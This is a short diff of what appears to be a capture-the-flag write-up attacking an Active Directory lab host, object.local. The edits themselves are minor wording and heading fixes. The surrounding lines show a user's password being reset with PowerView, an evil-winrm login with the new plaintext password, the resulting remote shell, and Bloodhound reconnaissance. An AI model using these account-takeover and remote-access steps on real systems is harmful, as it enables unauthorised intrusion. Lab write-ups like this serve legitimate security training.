@@ -410,7 +410,7 @@ Ill start by uploading powerview
 ```
 This changed `smith` password
 
-## Compromising `smith`
+# Compromising `smith`
 ```python
 evil-winrm -i object.local -u smith -p 'Password1234!'
                                         
@@ -423,4 +423,6 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\smith\Documents> 
 ```
-So after looking back at bloodhound this user is also part of remote me
+So after looking back at bloodhound this user is also part of remote management users
+
+# Bloodhound on `smith`
